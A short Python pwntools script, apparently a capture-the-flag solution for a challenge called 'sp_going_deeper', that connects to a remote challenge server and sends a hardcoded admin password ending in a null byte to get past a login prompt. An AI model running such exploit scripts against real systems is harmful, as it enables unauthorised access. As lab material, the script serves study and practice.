from pwn import * 

#p = process('./sp_going_deeper')
p = remote('159.65.89.199',32469)

payload = b'DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft\x00'

with open('in.txt','wb') as f:
    f.write(b'1\n')
    f.write(payload)

print(p.recvuntil(b"\x3e\x3e\x20").decode())
p.sendline(b"2")
print(p.recvuntil(b":").decode())
p.sendline(payload)
print(p.recvall().decode())